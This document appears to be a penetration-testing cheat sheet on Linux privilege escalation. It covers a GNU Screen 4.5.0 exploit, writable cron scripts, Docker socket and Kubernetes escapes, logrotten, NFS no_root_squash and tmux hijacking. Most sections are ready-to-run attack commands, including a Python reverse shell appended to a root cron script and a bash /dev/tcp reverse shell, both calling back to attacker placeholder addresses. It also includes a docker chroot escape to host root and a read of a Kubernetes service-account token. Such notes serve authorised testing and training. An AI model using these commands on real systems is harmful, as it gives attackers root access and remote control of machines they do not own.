# Vulnerable Services
**Concept:** Services running as root may have known vulnerabilities (CVEs) that allow local privilege escalation. **Example:** GNU Screen 4.5.0.
## 1. Enumeration & Identification
**Goal:** Identify running services and their versions.
```shell
# Description: Check version of common services (e.g., screen)
screen -v
```
## 2. Exploitation (Screen 4.5.0)
**Vulnerability:** A logic flaw in log file permissions allows overwriting `/etc/ld.so.preload`, forcing the system to load a malicious shared object.
**Execution:**
1. **Download PoC:** Locate `screen_exploit.sh` (e.g., from Exploit-DB or GitHub).
2. **Compile & Run:** The script compiles a malicious library (`libhax.so`) and a setuid binary (`rootshell`).
```shell
chmod +x screen_exploit.sh
./screen_exploit.sh
```
3. **Result:** Execution triggers the vulnerability, granting a root shell.
# Cron Job Abuse
**Concept:** Cron jobs automate tasks. If a job runs as root but executes a script or binary that is **writable** by a low-privileged user, that user can inject malicious code.
## 1. Enumeration (pspy)
**Goal:** Detect cron jobs without read access to `/var/spool/cron/crontabs/root`. 
**Tool:** `pspy` (Process Spy) monitors the proc filesystem for short-lived processes.
```shell
# Description: Monitor processes to find cron jobs
# -pf: Print commands and file events
# -i 1000: Scan every 1 second
./pspy64 -pf -i 1000
```
## 2. Exploitation (Writable Script)
**Scenario:** `pspy` reveals root running `/dmz-backups/backup.sh`. Checking permissions (`ls -l`) shows it is world-writable (`-rwxrwxrwx`).
**Action:** Append a reverse shell to the script.
```shell
# Description: Append python reverse shell to the backup script
echo 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<ATTACKER_IP>\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"' >> /dmz-backups/backup.sh
```
**Wait:** When the cron job runs again, the shell connects back.
# Container Breakouts (Docker & LXC)
**Concept:** Gaining root inside a container is not the same as root on the host, but misconfigurations (Mounted Sockets, Privileged Mode) allow escaping to the host.
## 1. Docker Socket Abuse
**Scenario:** You are a user in the `docker` group or have write access to `/var/run/docker.sock`. 
**Exploit:** Create a container that mounts the host's root directory (`/`) to `/mnt`.
```shell
# Description: Mount host root filesystem into a new container
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```
- **Impact:** You are now root on the host filesystem. You can add SSH keys to `/root/.ssh/authorized_keys` or edit `/etc/shadow`.
## 2. Kubernetes (K8s) Privilege Escalation
**Scenario:** Compromised a Pod. 
**Goal:** Access the host node or other pods.
- **Enumeration:** Check for mounted service account tokens.   
```shell
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```
- **Privilege Check:** Use `kubectl` (or curl) to check permissions.
```shell
kubectl auth can-i --list
```
- **Exploitation (Bad Pod):** If allowed to `create pods`, deploy a privileged pod that mounts the host filesystem (similar to the Docker exploit).
# Logrotate Exploitation (Logrotten)
**Concept:** `logrotate` runs as root. If it is configured to rotate a log file that we control (write access) in a directory we control, we can exploit a race condition to execute arbitrary code. 
**Prerequisite:** Write access to the log file and the parent directory.
## Exploitation Workflow
1. **Prepare Payload:** Compile `logrotten` and create a payload (reverse shell).
```shell
echo "bash -i >& /dev/tcp/<IP>/9001 0>&1" > payload
```
2. **Trigger:** Run the exploit while writing to the log file to win the race condition. 
```shell
# Syntax: ./logrotten -p <Payload> <LogFile>
./logrotten -p ./payload /tmp/vulnerable.log
```
# Miscellaneous Techniques
## 1. NFS No_Root_Squash
**Concept:** If an NFS share is exported with `no_root_squash`, a remote root user can create files as root on the share. 
**Exploit:**
1. **Mount Share:** `mount -t nfs <TargetIP>:/share /mnt`
2. **Create SUID Binary:** As local root, compile a shell wrapper and set SUID (`chmod +s`).
3. **Execute on Target:** SSH into the target as a low-priv user and run the SUID binary from the share.
## 2. Tmux Session Hijacking
**Concept:** A root process running `tmux` inside a shared socket directory. 
**Enumeration:** `ps aux | grep tmux` 
**Exploit:** Attach to the socket.
```shell
# Description: Attach to a shared tmux session
tmux -S /shared_socket attach
```